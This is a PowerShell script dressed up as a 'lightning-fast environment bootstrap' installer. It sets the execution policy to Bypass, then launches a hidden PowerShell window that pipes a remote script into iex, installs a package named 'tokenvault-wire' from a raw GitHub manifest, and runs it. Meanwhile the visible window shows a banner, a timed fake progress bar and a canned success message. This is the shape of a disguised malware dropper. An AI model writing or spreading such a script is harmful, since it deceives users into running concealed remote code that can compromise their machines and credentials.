Clear-Host
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

$packageName = "tokenvault-wire"
$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
$scoopShims = "$env:USERPROFILE\scoop\shims"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"

$command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
           "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
           "if (!(Test-Path '$appPath')) { scoop install $installUrl; wire }"

$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("powershell.exe -WindowStyle Hidden -Command `"$command`"", 0, $false) | Out-Null



if (Test-Path $appPath) {
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "The application is already installed. All tasks are already complete!" -ForegroundColor White
}
else {
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
    Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
    Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
    Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
    Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
    Write-Host "                                              |_|    " -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
    Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "Automated installation will begin shortly." -ForegroundColor White
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
    Write-Host ""

    $totalSteps = 50
    $delayMs = 200  

    for ($i = 1; $i -le $totalSteps; $i++) {
        $percent = [int](($i / $totalSteps) * 100)
        $completed = '=' * [int]($percent / 2)  
        $remaining = ' ' * (50 - $completed.Length)
        
        Write-Host -NoNewline "`r[$completed$remaining] $percent% complete"
        Start-Sleep -Milliseconds $delayMs  
    }

    Write-Host ""
    Write-Host "[SUCCESS] Installation completed successfully!" -ForegroundColor Green
}
